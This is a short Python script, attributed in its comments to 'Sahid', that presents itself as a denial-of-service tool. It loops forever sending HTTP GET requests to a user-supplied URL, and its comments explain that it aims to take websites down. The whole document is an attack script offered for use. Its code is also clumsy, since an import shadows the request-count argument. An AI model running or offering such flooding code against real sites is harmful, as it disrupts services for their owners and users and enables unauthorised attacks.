#this is simple DoS(Denial of Service) script made using python by Sahid.
#Note: this is not DDoS(Distributed Denial of Service) script.
#DoS is an attack that down websites or webserver for temporary time. It attack the targeted website using your IP address.


def dos(url,requests):
    while True:
        for i in range(requests):
            import requests
            attack = requests.get(url)
            print("Requests Send Successfully!!!")
            
url = input("Enter URL:  ")
requests = int(input("Enter Requests: "))
dos(url,requests)